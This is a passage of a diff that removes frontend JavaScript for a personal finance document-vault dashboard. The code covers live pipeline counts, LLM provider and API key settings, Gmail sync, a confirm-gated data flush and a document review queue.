-  document.getElementById("income").textContent = money(s.income_minor);
-  document.getElementById("spend").textContent = money(s.spending_minor);
-  document.getElementById("invest").textContent = money(s.investments_net_minor);
-  document.getElementById("xfer").textContent = money(s.transfers_minor);
-  document.getElementById("incomeN").innerHTML = "<b>" + esc(s.income_documents) + "</b> documents · net of refunds";
-  document.getElementById("spendN").innerHTML = "<b>" + esc(s.spending_documents) + "</b> documents · net of refunds";
-  document.getElementById("investN").innerHTML = "<b>" + esc(s.investment_documents) + "</b> documents · purchases";
-
-  const ucNote = (arr) => !arr || !arr.length ? "" : arr.map((u) =>
-    "<span class='warn'>" + esc(u.currency || "?") + " " + money(u.amount_minor).replace("₹","")
-    + " (" + esc(u.transactions) + " txns)</span>").join("  ");
-  document.getElementById("incomeSub").innerHTML = ucNote(s.unconverted.income);
-  document.getElementById("spendSub").innerHTML = ucNote(s.unconverted.spending);
-  document.getElementById("investSub").innerHTML = "";
-  document.getElementById("xferSub").innerHTML = ucNote(s.unconverted.transfers);
-}
-
-async function showCard(id) {
-  selected = id;
-  const c = await api("/v1/transactions/" + id + "/evidence");
-  const t = c.transaction;
-  const docs = (c.evidence || []).map((e) => {
-    const refs = e.extraction && e.extraction.reference_ids || {};
-    const shared = Object.entries(refs).map(([k, v]) =>
-      (c.evidence || []).filter((o) => o.extraction && o.extraction.reference_ids
-        && Object.values(o.extraction.reference_ids).includes(v)).length > 1
-        ? "<em>" + esc(k) + "=" + esc(v) + "</em>" : esc(k) + "=" + esc(v)).join("  ");
-    return "<div class='doc'><div class='fn'>" + esc(e.original_filename) + "</div>"
-      + "<div class='rf'>" + esc(e.evidence_role) + " · linked by " + esc(e.linked_by)
-      + (e.match_score ? " at " + Number(e.match_score).toFixed(2) : "")
-      + (shared ? "<br>" + shared : "") + "</div></div>";
-  }).join("");
-  const prov = (c.provenance || []).map((p) =>
-    esc(p.field) + "=" + esc(p.value) + " [" + esc(p.source) + "]").join("   ");
-  document.getElementById("card").innerHTML =
-    "<div class='card'><h3>Evidence · " + money(t.amount_minor) + " · "
-    + esc(t.counterparty_name || "transfer") + "</h3>" + docs
-    + (prov ? "<div class='prov'>" + prov + "</div>" : "")
-    + "<div class='sum'>" + esc(c.summary) + "</div></div>";
-}
-
-// ── observability: document pipeline ─────────────────────────────
-const STATES = [
-  { k: "received", label: "Received", cls: "active" },
-  { k: "stable", label: "Stable", cls: "active" },
-  { k: "hashed", label: "Hashed", cls: "active" },
-  { k: "triaged", label: "Triaged", cls: "active" },
-  { k: "queued", label: "Queued", cls: "active" },
-  { k: "processing", label: "Processing", cls: "active" },
-  { k: "complete", label: "Complete", cls: "complete" },
-  { k: "failed", label: "Failed", cls: "failed" },
-  { k: "duplicate", label: "Duplicate", cls: "duplicate term" },
-  { k: "irrelevant", label: "Irrelevant", cls: "irrelevant term" },
-  { k: "password_needed", label: "Password", cls: "password_needed" },
-];
-
-// Live pipeline counts — updated incrementally from SSE events so the user
-// can watch documents move from received → stable → hashed → … → complete
-// in real time without waiting for a full refresh.
-let pipelineCounts = {};
-let pipelineStalled = 0;
-
-function renderPipelineBoard() {
-  const board = document.getElementById("board");
-  if (!board) return;
-  board.innerHTML = STATES.map((st) => {
-    const n = pipelineCounts[st.k] || 0;
-    return "<div class='state " + esc(st.cls) + "'><div class='k'>" + esc(st.label) + "</div>"
-      + "<div class='v " + (n ? "" : "zero") + "'>" + esc(n) + "</div></div>";
-  }).join("") + (pipelineStalled
-    ? "<div class='state stalled'><div class='k'>Stalled</div><div class='v'>" + esc(pipelineStalled) + "</div></div>"
-    : "");
-}
-
-// Apply a PipelineStateChanged event to the live counts and re-render the
-// board immediately — this is what makes the numbers tick in real time.
-function onPipelineStateChanged(data) {
-  if (data.from_state) {
-    pipelineCounts[data.from_state] = Math.max(0, (pipelineCounts[data.from_state] || 0) - 1);
-  }
-  if (data.to_state) {
-    pipelineCounts[data.to_state] = (pipelineCounts[data.to_state] || 0) + 1;
-  }
-  renderPipelineBoard();
-}
-
-// A new document arriving increments the "received" counter immediately.
-function onDocumentReceived() {
-  pipelineCounts["received"] = (pipelineCounts["received"] || 0) + 1;
-  renderPipelineBoard();
-}
-
-async function refreshPipeline() {
-  const intake = await api("/v1/intake/status?limit=100");
-  const events = intake.events || [];
-  document.getElementById("intakeCount").textContent = events.length + " items";
-  // Rebuild counts from the authoritative server state.
-  pipelineCounts = {};
-  for (const e of events) pipelineCounts[e.processing_state] = (pipelineCounts[e.processing_state] || 0) + 1;
-  pipelineStalled = 0;
-  for (const e of events) if (e.stalled) pipelineStalled++;
-  renderPipelineBoard();
-
-  const box = document.getElementById("intake");
-  if (!events.length) { box.innerHTML = "<div class='empty'>No intake events yet.</div>"; return; }
-  box.innerHTML = events.map((e) => {
-    const state = esc(e.processing_state);
-    const err = e.last_error ? "<span class='err'>" + esc(e.last_error) + "</span>" : "";
-    const stall = e.stalled ? "  <span class='stall'>STALLED</span>" : "";
-    const retry = e.retry_count ? "  · retry " + esc(e.retry_count) : "";
-    const docLink = e.document_id ? "  · doc " + esc(String(e.document_id).slice(0, 12)) : "";
-    const meta = "<div class='meta'>" + esc(e.kind) + " · " + esc(e.source) + retry
-      + docLink + (err ? "  · " + err : "") + stall + "</div>";
-    return "<div class='irow'>"
-      + "<div><div class='fn'>" + esc(e.filename) + "</div>" + meta + "</div>"
-      + "<span class='pill " + state + "'>" + state + "</span>"
-      + "<span class='age'>" + ago(e.updated_at || e.created_at) + "</span></div>";
-  }).join("");
-}
-
-// ── live event stream ────────────────────────────────────────────
-const DESC = {
-  DocumentReceived:   (e) => "received  " + e.filename,
-  DocumentDuplicate:  (e) => "duplicate  " + e.filename + "  (same bytes — ignored)",
-  MarkdownReady:      (e) => "converted  " + e.chars + " chars",
-  AnalysisComplete:   (e) => "analysed  " + String(e.document_id || "").slice(0, 12),
-  TransactionRecorded:(e) => "transaction  " + money(e.amount_minor) + "  " + e.direction,
-  MatchProposed:      (e) => "MATCHED  score " + Number(e.score).toFixed(2) + "  → one rupee",
-  JobStateChanged:    (e) => e.phase + "  " + e.state,
-  PipelineStateChanged: (e) => (e.from_state || "—") + " → " + e.to_state,
-};
-function push(type, data) {
-  const f = document.getElementById("feed");
-  if (f.dataset.virgin !== "1") { f.innerHTML = ""; f.dataset.virgin = "1"; }
-  const d = document.createElement("div");
-  d.className = "fe " + type;
-  const say = DESC[type] ? DESC[type](data) : type;
-  d.innerHTML = "<span class='t'>" + clock() + "</span><span class='n'>" + esc(say) + "</span>";
-  f.prepend(d);
-  while (f.children.length > 80) f.lastChild.remove();
-}
-
-function connect() {
-  const es = new EventSource("/v1/events?token=" + encodeURIComponent(TOKEN));
-  const dot = document.getElementById("dot");
-  es.onopen = () => { dot.className = "dot live"; };
-  es.onerror = () => { dot.className = "dot dead"; };
-  for (const type of Object.keys(DESC).concat("Ready")) {
-    es.addEventListener(type, (m) => {
-      let d = {}; try { d = JSON.parse(m.data); } catch {}
-      if (type !== "Ready") push(type, d);
-      // Pipeline state changes update the board instantly — no debounce —
-      // so the user can watch documents flow through the pipeline live.
-      if (type === "PipelineStateChanged") onPipelineStateChanged(d);
-      else if (type === "DocumentReceived") onDocumentReceived();
-      if (["TransactionRecorded", "MatchProposed", "AnalysisComplete",
-           "DocumentReceived", "JobStateChanged"].includes(type)) {
-        clearTimeout(window.__rt);
-        window.__rt = setTimeout(() => { if (activeTab === "obs") refreshObs(); }, 220);
-      }
-    });
-  }
-}
-
-async function refreshObs() {
-  await Promise.all([refreshHealth(), refreshMoney(), refreshPipeline()]);
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// SETTINGS TAB
-// ════════════════════════════════════════════════════════════════════════
-
-// Known LLM providers. The user picks one from a dropdown; the base URL is
-// set automatically. "Custom" lets them type their own.
-// Alphabetical by name (Custom forced to last).
-const PROVIDERS = [
-  { id: "alibaba",    name: "Alibaba Cloud",       baseUrl: "https://dashscope-intl.aliyuncs.com/api/v1" },
-  { id: "anthropic",  name: "Anthropic",           baseUrl: "https://api.anthropic.com/v1" },
-  { id: "groq",       name: "Groq",                baseUrl: "https://api.groq.com/openai/v1" },
-  { id: "kimi",       name: "Kimi (Moonshot AI)",  baseUrl: "https://api.moonshot.ai/v1" },
-  { id: "minimax",    name: "MiniMax",             baseUrl: "https://api.minimax.io/v1" },
-  { id: "mimo",       name: "MiMo (Xiaomi)",       baseUrl: "https://api.xiaomimimo.com/v1" },
-  { id: "openai",     name: "OpenAI",              baseUrl: "https://api.openai.com/v1" },
-  { id: "openrouter", name: "OpenRouter",          baseUrl: "https://openrouter.ai/api/v1" },
-  { id: "perplexity", name: "Perplexity",          baseUrl: "https://api.perplexity.ai/v1" },
-  { id: "poolside",   name: "Poolside",            baseUrl: "https://inference.poolside.ai/v1" },
-  { id: "together",   name: "Together AI",         baseUrl: "https://api.together.ai/v1" },
-  { id: "custom",     name: "Custom",              baseUrl: "" },
-];
-
-function providerIdForBaseUrl(baseUrl) {
-  const p = PROVIDERS.find((p) => p.baseUrl && p.baseUrl === baseUrl);
-  return p ? p.id : (baseUrl ? "custom" : "");
-}
-
-function fillProviderDropdown(selectId, currentBaseUrl) {
-  const sel = document.getElementById(selectId);
-  const currentId = providerIdForBaseUrl(currentBaseUrl);
-  sel.innerHTML = PROVIDERS.map((p) =>
-    "<option value='" + esc(p.id) + "'" + (p.id === currentId ? " selected" : "") + ">"
-    + esc(p.name) + "</option>").join("");
-}
-
-// The masked key shown in the text box (first4*******last4). Stored at load
-// time so saveAi can detect when the user hasn't touched the field.
-let primaryKeyMask = "";
-let secondaryKeyMask = "";
-// Per-provider key inventory from the backend: { openai: { set: true, mask: "..." }, ... }
-let providerKeys = {};
-let secondaryProviderKeys = {};
-// Track the current provider IDs so we can save keys per-provider on switch.
-let currentPrimaryProviderId = "";
-let currentSecondaryProviderId = "";
-
-async function loadSettings() {
-  const s = await api("/v1/settings");
-  const ai = s.ai || {};
-
-  // Store per-provider key inventory for swapping keys on provider change.
-  providerKeys = ai.provider_keys || {};
-  secondaryProviderKeys = ai.provider_keys || {};
-
-  // Primary provider
-  fillProviderDropdown("aiProvider", ai.base_url || "");
-  currentPrimaryProviderId = document.getElementById("aiProvider").value;
-  document.getElementById("aiBaseUrl").value = ai.base_url || "";
-  toggleCustomUrl("primary");
-  document.getElementById("aiKeySrc").innerHTML = ai.api_key_set
-    ? "<span class='ok'>key set via " + esc(ai.api_key_source) + "</span>"
-    : "<span class='warn'>no key configured</span>";
-  primaryKeyMask = ai.api_key_mask || "";
-  const aiKeyInput = document.getElementById("aiApiKey");
-  aiKeyInput.value = primaryKeyMask;
-  aiKeyInput.placeholder = ai.api_key_set ? "type a new key to replace" : "paste your API key";
-  // Model is a text input with a datalist of fetched models. Show the saved
-  // model as the value; the datalist is populated by autoFetchModels.
-  document.getElementById("aiModel").value = ai.model || "";
-
-  // Secondary provider
-  const sec = ai.secondary || {};
-  fillProviderDropdown("ai2Provider", sec.base_url || "");
-  currentSecondaryProviderId = document.getElementById("ai2Provider").value;
-  document.getElementById("ai2BaseUrl").value = sec.base_url || "";
-  toggleCustomUrl("secondary");
-  secondaryKeyMask = sec.api_key_mask || "";
-  document.getElementById("ai2KeySrc").innerHTML = sec.api_key_set
-    ? "<span class='ok'>key set via " + esc(sec.api_key_source || "keychain") + "</span>"
-    : "<span class='warn'>no key configured</span>";
-  const ai2KeyInput = document.getElementById("ai2ApiKey");
-  ai2KeyInput.value = secondaryKeyMask;
-  ai2KeyInput.placeholder = sec.api_key_set ? "type a new key to replace" : "paste your API key";
-  document.getElementById("ai2Model").value = sec.model || "";
-
-  // Auto-fetch model lists for the selected providers (silent — the user can
-  // still type a model manually if the fetch fails).
-  autoFetchModels("primary");
-  autoFetchModels("secondary");
-
-  // Jurisdiction
-  const jur = s.jurisdiction || {};
-  const sel = document.getElementById("jurSelect");
-  sel.innerHTML = (jur.available || []).map((p) =>
-    "<option value='" + esc(p.id) + "'" + (p.id === jur.id ? " selected" : "") + ">"
-    + esc(p.name) + " (" + esc(p.id) + " v" + esc(p.version) + ")</option>").join("");
-  document.getElementById("jurInfo").innerHTML =
-    "Currency <b>" + esc(jur.currency) + "</b> · FY " + esc(jur.fy_label)
-    + " · dates " + esc(jur.date_format) + " · grouping " + esc(jur.grouping);
-
-  // Vault
-  const v = s.vault || {};
-  document.getElementById("vRoot").textContent = v.root || "—";
-  document.getElementById("vDrop").textContent = v.drop || "—";
-  document.getElementById("vDb").textContent = v.db || "—";
-  // Initial state — testAi will update these with the real result.
-  document.getElementById("vAi").innerHTML = ai.active_model
-    ? "<span style='color:var(--faint)'>testing " + esc(ai.active_model) + "…</span>"
-    : "<span style='color:var(--bad)'>no primary model</span>";
-  document.getElementById("vAi2").innerHTML = sec.model
-    ? "<span style='color:var(--faint)'>testing " + esc(sec.model) + "…</span>"
-    : "<span style='color:var(--faint)'>no secondary model</span>";
-
-  // Gmail
-  const g = s.gmail || {};
-  document.getElementById("gAddr").textContent = g.address || "not configured";
-  document.getElementById("gStatus").textContent = g.status || "—";
-  // Default the date picker to today if the user hasn't set it yet.
-  const gDate = document.getElementById("gAfterDate");
-  if (!gDate.value) gDate.value = new Date().toISOString().slice(0, 10);
-
-  // Auto-test both inference providers so the user sees a green/red status
-  // the moment they open Settings — no need to click Test manually.
-  testAi("primary");
-  testAi("secondary");
-}
-
-function providerBaseUrl(which) {
-  const sel = document.getElementById(which === "primary" ? "aiProvider" : "ai2Provider");
-  const p = PROVIDERS.find((p) => p.id === sel.value);
-  if (!p) return "";
-  if (p.id === "custom") {
-    const input = document.getElementById(which === "primary" ? "aiBaseUrl" : "ai2BaseUrl");
-    return input.value.trim();
-  }
-  return p.baseUrl;
-}
-
-function toggleCustomUrl(which) {
-  const sel = document.getElementById(which === "primary" ? "aiProvider" : "ai2Provider");
-  const row = document.getElementById(which === "primary" ? "aiCustomUrlRow" : "ai2CustomUrlRow");
-  row.style.display = sel.value === "custom" ? "" : "none";
-}
-
-async function autoFetchModels(which) {
-  const baseUrl = providerBaseUrl(which);
-  if (!baseUrl) return;
-  const list = document.getElementById(which === "primary" ? "aiModelList" : "ai2ModelList");
-  const keyInput = document.getElementById(which === "primary" ? "aiApiKey" : "ai2ApiKey");
-  const key = keyInput.value;
-  const mask = which === "primary" ? primaryKeyMask : secondaryKeyMask;
-  // If the user hasn't changed the mask, send empty string — the backend will
-  // use the stored key from the secret store.
-  const apiKey = key && key !== mask ? key : "";
-  try {
-    const r = await apiPost("/v1/settings/models", { base_url: baseUrl, api_key: apiKey });
-    if (r.error) return;
-    const models = r.models || [];
-    list.innerHTML = models.map((m) => "<option value='" + esc(m) + "'>").join("");
-  } catch { /* silent — the user can still type a model manually */ }
-}
-
-async function saveAi(which) {
-  const msg = document.getElementById(which === "primary" ? "aiMsg" : "ai2Msg");
-  const baseUrl = providerBaseUrl(which);
-  const model = document.getElementById(which === "primary" ? "aiModel" : "ai2Model").value.trim();
-  // Don't auto-save an incomplete Custom provider — the user is still typing
-  // the URL. Saving an empty base_url would clobber the previous config and
-  // cause spurious test errors.
-  const sel = document.getElementById(which === "primary" ? "aiProvider" : "ai2Provider");
-  if (sel.value === "custom" && !baseUrl) return;
-  const keyInput = document.getElementById(which === "primary" ? "aiApiKey" : "ai2ApiKey");
-  const key = keyInput.value;
-  const mask = which === "primary" ? primaryKeyMask : secondaryKeyMask;
-  const body = {};
-  // Use the tracked provider ID (not sel.value) so that when the user
-  // switches providers, the old provider's key is saved under the old ID
-  // before the new provider's key is loaded.
-  const pid = which === "primary" ? (currentPrimaryProviderId || sel.value) : (currentSecondaryProviderId || sel.value);
-  if (which === "primary") {
-    body.base_url = baseUrl;
-    body.model = model;
-    body.api_key_provider = pid;
-    if (key && key !== mask) body.api_key = key;
-    else if (!key) body.api_key = "";
-  } else {
-    body.secondary_base_url = baseUrl;
-    body.secondary_model = model;
-    body.secondary_api_key_provider = pid;
-    if (key && key !== mask) body.secondary_api_key = key;
-    else if (!key) body.secondary_api_key = "";
-  }
-  const r = await apiPost("/v1/settings", body);
-  if (r.error) { msg.className = "msg bad"; msg.textContent = "error: " + r.error; return; }
-  // Silent on success — auto-save doesn't need a "saved" flash. The Test
-  // button is the user's confirmation that the setting works.
-  // Do NOT call loadSettings() here — it would rebuild the dropdowns and
-  // clobber the user's in-progress edits (e.g. selecting Custom).
-  msg.className = "msg"; msg.textContent = "";
-}
-
-async function testAi(which) {
-  const msg = document.getElementById(which === "primary" ? "aiMsg" : "ai2Msg");
-  const vEl = document.getElementById(which === "primary" ? "vAi" : "vAi2");
-  msg.className = "msg"; msg.textContent = "testing…";
-  const r = await apiPost("/v1/settings/provider-test", { which });
-  if (r.error) {
-    msg.className = "msg bad"; msg.textContent = "error: " + r.error;
-    vEl.innerHTML = "<span style='color:var(--bad)'>" + esc(r.model || "?") + " · " + esc(r.error) + "</span>";
-    return;
-  }
-  const ok = r.reachable && r.authenticated && r.model_available;
-  msg.className = "msg " + (ok ? "ok" : "bad");
-  const parts = [];
-  parts.push(r.reachable ? "reachable" : "unreachable");
-  parts.push(r.authenticated ? "auth ok" : "auth failed");
-  parts.push(r.model_available ? "model ok" : "model unavailable");
-  if (r.latency_ms) parts.push(r.latency_ms + "ms");
-  if (r.vision) parts.push("vision");
-  if (r.structured_output) parts.push("structured");
-  msg.textContent = parts.join(" · ");
-  // Update the Vault summary with the real test result.
-  vEl.innerHTML = ok
-    ? "<span style='color:var(--ok)'>" + esc(r.model || "?") + " · available</span>"
-    : "<span style='color:var(--bad)'>" + esc(r.model || "?") + " · " + parts.slice(1).join(", ") + "</span>";
-}
-
-async function saveJur() {
-  const msg = document.getElementById("jurMsg");
-  msg.className = "msg"; msg.textContent = "saving…";
-  const id = document.getElementById("jurSelect").value;
-  const r = await apiPost("/v1/settings", { jurisdiction: id });
-  if (r.error) { msg.className = "msg bad"; msg.textContent = "error: " + r.error; return; }
-  msg.className = "msg ok";
-  msg.textContent = "saved · restart the daemon for the jurisdiction change to take full effect";
-  loadSettings();
-}
-
-// Auto-save: any change to provider, API key, model, or custom URL saves
-// immediately. A debounce on the model text input prevents saving on every
-// keystroke — only after the user stops typing for 600ms.
-let saveTimers = {};
-function autoSave(which) {
-  clearTimeout(saveTimers[which]);
-  saveTimers[which] = setTimeout(() => saveAi(which), 600);
-}
-
-// When the user switches providers, swap the API key field to show the new
-// provider's saved key (or empty if none). The old provider's key was already
-// saved by autoSave on the previous change.
-function swapProviderKey(which) {
-  const sel = document.getElementById(which === "primary" ? "aiProvider" : "ai2Provider");
-  const newPid = sel.value;
-  const keys = which === "primary" ? providerKeys : secondaryProviderKeys;
-  const keyField = document.getElementById(which === "primary" ? "aiApiKey" : "ai2ApiKey");
-  const keySrc = document.getElementById(which === "primary" ? "aiKeySrc" : "ai2KeySrc");
-  const lookupKey = which === "primary" ? newPid : `secondary:${newPid}`;
-  const entry = keys[lookupKey];
-  if (entry && entry.set) {
-    const mask = entry.mask || "********";
-    keyField.value = mask;
-    if (which === "primary") primaryKeyMask = mask;
-    else secondaryKeyMask = mask;
-    keySrc.innerHTML = "<span class='ok'>key set via keychain</span>";
-    keyField.placeholder = "type a new key to replace";
-  } else {
-    keyField.value = "";
-    if (which === "primary") primaryKeyMask = "";
-    else secondaryKeyMask = "";
-    keySrc.innerHTML = "<span class='warn'>no key configured</span>";
-    keyField.placeholder = "paste your API key";
-  }
-  if (which === "primary") currentPrimaryProviderId = newPid;
-  else currentSecondaryProviderId = newPid;
-}
-
-document.getElementById("aiTest").onclick = () => testAi("primary");
-document.getElementById("aiProvider").onchange = () => {
-  // Save the old provider's key first, then swap to the new provider's key.
-  saveAi("primary");
-  toggleCustomUrl("primary");
-  swapProviderKey("primary");
-  autoFetchModels("primary");
-  autoSave("primary");
-};
-document.getElementById("aiApiKey").onchange = () => autoSave("primary");
-document.getElementById("aiModel").oninput = () => autoSave("primary");
-document.getElementById("aiBaseUrl").oninput = () => autoSave("primary");
-document.getElementById("ai2Test").onclick = () => testAi("secondary");
-document.getElementById("ai2Provider").onchange = () => {
-  saveAi("secondary");
-  toggleCustomUrl("secondary");
-  swapProviderKey("secondary");
-  autoFetchModels("secondary");
-  autoSave("secondary");
-};
-document.getElementById("ai2ApiKey").onchange = () => autoSave("secondary");
-document.getElementById("ai2Model").oninput = () => autoSave("secondary");
-document.getElementById("ai2BaseUrl").oninput = () => autoSave("secondary");
-document.getElementById("jurSave").onclick = saveJur;
-
-async function gmailAction(action) {
-  const msg = document.getElementById("gMsg");
-  msg.className = "msg"; msg.textContent = action + "…";
-  const endpoint = "/v1/gmail/" + action;
-  const body = {};
-  if (action === "sync") {
-    body.after_date = document.getElementById("gAfterDate").value;
-    body.force = document.getElementById("gForce").checked;
-  }
-  const r = await apiPost(endpoint, body);
-  if (r.error) {
-    msg.className = "msg bad"; msg.textContent = r.error;
-    if (r.detail) msg.textContent += " — " + r.detail;
-    return;
-  }
-  msg.className = "msg ok";
-  if (action === "connect") {
-    if (r.auth_url) {
-      msg.textContent = "Opening authorisation…";
-      window.open(r.auth_url, "_blank");
-    } else {
-      msg.textContent = "connected";
-    }
-  } else if (action === "sync") {
-    msg.textContent = "synced · " + (r.synced ?? r.fetched ?? "done");
-  } else if (action === "disconnect") {
-    msg.textContent = "disconnected";
-  }
-  loadSettings();
-}
-document.getElementById("gConnect").onclick = () => gmailAction("connect");
-document.getElementById("gSync").onclick = () => gmailAction("sync");
-document.getElementById("gDisconnect").onclick = () => gmailAction("disconnect");
-
-// ── danger zone: data flush / factory reset ────────────────────────
-let dangerMode = "";
-const dangerBtn = document.getElementById("flushBtn");
-const dangerConfirmRow = document.getElementById("dangerConfirmRow");
-const dangerConfirmInput = document.getElementById("dangerConfirmInput");
-const dangerGoBtn = document.getElementById("dangerGoBtn");
-const dangerCancelBtn = document.getElementById("dangerCancelBtn");
-const dangerMsg = document.getElementById("flushMsg");
-
-document.querySelectorAll("input[name='dangerMode']").forEach((r) => {
-  r.onchange = (e) => {
-    dangerMode = e.target.value;
-    if (dangerMode === "none") {
-      dangerBtn.disabled = true;
-      dangerBtn.textContent = "Flush Data";
-    } else {
-      dangerBtn.disabled = false;
-      dangerBtn.textContent = dangerMode === "flush" ? "Flush Data" : "Factory Reset";
-    }
-    dangerMsg.className = "msg"; dangerMsg.textContent = "";
-  };
-});
-
-dangerBtn.onclick = () => {
-  dangerConfirmRow.style.display = "";
-  dangerConfirmInput.value = "";
-  dangerGoBtn.disabled = true;
-  dangerBtn.style.display = "none";
-};
-
-dangerConfirmInput.oninput = () => {
-  dangerGoBtn.disabled = dangerConfirmInput.value.trim().toUpperCase() !== "CONFIRM";
-};
-
-dangerCancelBtn.onclick = () => {
-  dangerConfirmRow.style.display = "none";
-  dangerConfirmInput.value = "";
-  dangerGoBtn.disabled = true;
-  dangerBtn.style.display = "";
-};
-
-dangerGoBtn.onclick = async () => {
-  dangerMsg.className = "msg"; dangerMsg.textContent = "erasing…";
-  dangerGoBtn.disabled = true;
-  const endpoint = dangerMode === "flush" ? "/v1/vault/flush" : "/v1/vault/factory-reset";
-  const confirmVal = dangerMode === "flush" ? "FLUSH" : "FACTORY_RESET";
-  const r = await apiPost(endpoint, { confirm: confirmVal });
-  if (r.error) {
-    dangerMsg.className = "msg bad"; dangerMsg.textContent = "error: " + r.error;
-    dangerGoBtn.disabled = false;
-    return;
-  }
-  dangerMsg.className = "msg ok";
-  dangerMsg.textContent = "done · " + (r.rows_deleted ?? 0) + " rows deleted";
-  dangerConfirmRow.style.display = "none";
-  dangerBtn.style.display = "";
-  dangerBtn.disabled = true;
-  dangerBtn.textContent = "Flush Data";
-  document.querySelectorAll("input[name='dangerMode']").forEach((r) => r.checked = false);
-  dangerMode = "";
-  loadSettings();
-  if (activeTab === "obs") refreshObs();
-};
-
-// ════════════════════════════════════════════════════════════════════════
-// PEOPLE TAB
-// ════════════════════════════════════════════════════════════════════════
-async function loadPeople() {
-  const [p, e] = await Promise.all([api("/v1/people"), api("/v1/entities")]);
-  const people = p.people || [];
-  document.getElementById("peopleCount").textContent = "· " + people.length + " people";
-  document.getElementById("peopleList").innerHTML = !people.length
-    ? "<div class='empty'>No people yet.</div>"
-    : people.map((x) =>
-      "<div class='ent' data-id='" + esc(x.id) + "' data-kind='person'>"
-      + "<div><span class='nm'>" + esc(x.display_name)
-      + (x.is_owner ? " <span class='sub'>★ owner</span>" : x.is_member ? " <span class='sub'>member</span>" : "")
-      + "</span><span class='sub'>" + esc(x.subtype || "") + "</span></div>"
-      + "<span class='kind person'>person</span>"
-      + "<span class='stat " + esc(x.status) + "'>" + esc(x.status) + "</span>"
-      + "<span class='ct'>" + esc(x.document_count) + " docs · " + esc(x.transaction_count) + " txns</span></div>"
-    ).join("");
-
-  const ents = e.entities || [];
-  document.getElementById("entCount").textContent = "· " + ents.length + " entities";
-  document.getElementById("entList").innerHTML = !ents.length
-    ? "<div class='empty'>No entities yet.</div>"
-    : ents.map((x) =>
-      "<div class='ent' data-id='" + esc(x.id) + "' data-kind='" + esc(x.kind) + "'>"
-      + "<div><span class='nm'>" + esc(x.display_name) + "</span></div>"
-      + "<span class='kind " + esc(x.kind) + "'>" + esc(x.kind) + "</span>"
-      + "<span class='stat " + esc(x.status) + "'>" + esc(x.status) + "</span>"
-      + "<span class='ct'>" + esc((x.conflicts || []).length) + " conflicts</span></div>"
-    ).join("");
-
-  document.querySelectorAll("#peopleList .ent, #entList .ent").forEach((el) =>
-    el.onclick = () => showPerson(el.dataset.id));
-}
-
-async function showPerson(id) {
-  const d = await api("/v1/people/" + encodeURIComponent(id));
-  const person = d.person || {};
-  const aliases = d.aliases || [];
-  const docs = d.documents || [];
-  const txns = d.transactions || [];
-  const aliasesHtml = aliases.map((a) =>
-    "<div class='rule'><span class='k'>" + esc(a.alias_type) + "</span>"
-    + "<span class='v'>" + esc(a.alias) + " <span style='color:var(--faint)'>· " + esc(a.status) + "</span></span>"
-    + "<span class='n'>" + esc(a.supporting_documents || 0) + " docs</span></div>").join("");
-  const docsHtml = docs.map((x) =>
-    "<div class='rule'><span class='k'>" + esc(x.role) + "</span>"
-    + "<span class='v'>" + esc(x.original_filename) + "</span>"
-    + "<span class='n'>" + esc(String(x.received_at || "").slice(0, 10)) + "</span></div>").join("");
-  const txnsHtml = txns.map((x) =>
-    "<div class='rule'><span class='k'>" + esc(x.direction) + "</span>"
-    + "<span class='v'>" + money(x.amount_minor) + " · " + esc(x.counterparty_name || "transfer") + "</span>"
-    + "<span class='n'>" + esc(String(x.occurred_at || "").slice(0, 10)) + "</span></div>").join("");
-  document.getElementById("personDetail").innerHTML =
-    "<div class='panel'><h3>" + esc(person.display_name) + " · " + esc(person.kind) + "</h3>"
-    + "<div class='grid3'>"
-    + "<div><div style='font:10.5px var(--mono);color:var(--faint);text-transform:uppercase'>Status</div>"
-    + "<div style='font:12px var(--mono);margin-top:3px'>" + esc(person.status) + "</div></div>"
-    + "<div><div style='font:10.5px var(--mono);color:var(--faint);text-transform:uppercase'>Confidence</div>"
-    + "<div style='font:12px var(--mono);margin-top:3px'>" + esc(person.confidence) + "</div></div>"
-    + "<div><div style='font:10.5px var(--mono);color:var(--faint);text-transform:uppercase'>Subtype</div>"
-    + "<div style='font:12px var(--mono);margin-top:3px'>" + esc(person.subtype || "—") + "</div></div>"
-    + "</div>"
-    + "<h3 style='margin-top:18px'>Aliases</h3>" + (aliasesHtml || "<div class='empty'>No aliases.</div>")
-    + "<h3 style='margin-top:18px'>Documents</h3>" + (docsHtml || "<div class='empty'>No linked documents.</div>")
-    + "<h3 style='margin-top:18px'>Transactions</h3>" + (txnsHtml || "<div class='empty'>No linked transactions.</div>")
-    + "</div>";
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// DOCUMENTS REVIEW TAB
-// ════════════════════════════════════════════════════════════════════════
-async function loadReview() {
-  const [r, d] = await Promise.all([api("/v1/reviews"), api("/v1/documents?limit=100")]);
-  const revs = r.reviews || [];
-  document.getElementById("revCount").textContent = "· " + revs.length + " items";
-  document.getElementById("revList").innerHTML = !revs.length
-    ? "<div class='empty'>Review queue is empty.</div>"
-    : revs.map((rv) => {
-      const meta = [];
-      if (rv.amount_minor) meta.push(money(rv.amount_minor) + " " + esc(rv.currency || ""));
-      if (rv.counterparty) meta.push(esc(rv.counterparty));
-      if (rv.doc_type) meta.push(esc(rv.doc_type));
-      if (rv.detail) meta.push(esc(rv.detail));
-      const actions = rv.kind === "unconfirmed_entity"
-        ? "<button class='yes' data-act='confirm' data-id='" + esc(rv.entity_id) + "'>Confirm entity</button>"
-        : rv.kind === "orphan_document"
-          ? "<button class='yes' data-act='link' data-id='" + esc(rv.document_id) + "'>Review document</button>"
-          : rv.kind === "failed_job"
-            ? "<button class='yes' data-act='reprocess' data-id='" + esc(rv.document_id) + "'>Reprocess</button>"
-            : "";
-      return "<div class='rev'><div class='kind " + esc(rv.kind) + "'>" + esc(rv.kind.replace(/_/g, " ")) + "</div>"
-        + "<div class='q'>" + esc(rv.question) + "</div>"
-        + (meta.length ? "<div class='meta'>" + meta.join(" · ") + "</div>" : "")
-        + "<div class='actions'>" + actions + "</div></div>";
-    }).join("");
-
-  document.querySelectorAll("#revList .yes").forEach((b) => b.onclick = () => handleReviewAction(b.dataset.act, b.dataset.id));
-
-  const docs = d.documents || [];
-  document.getElementById("docCount").textContent = "· " + docs.length + " documents";
-  document.getElementById("docList").innerHTML = !docs.length
-    ? "<div class='empty'>No documents.</div>"
-    : docs.map((x) =>
-      "<div class='drow' data-id='" + esc(x.id) + "'>"
-      + "<div><div class='fn'>" + esc(x.original_filename) + "</div>"
-      + "<div class='meta'>" + esc(x.doc_type || "unknown") + " · " + esc(x.ext || "")
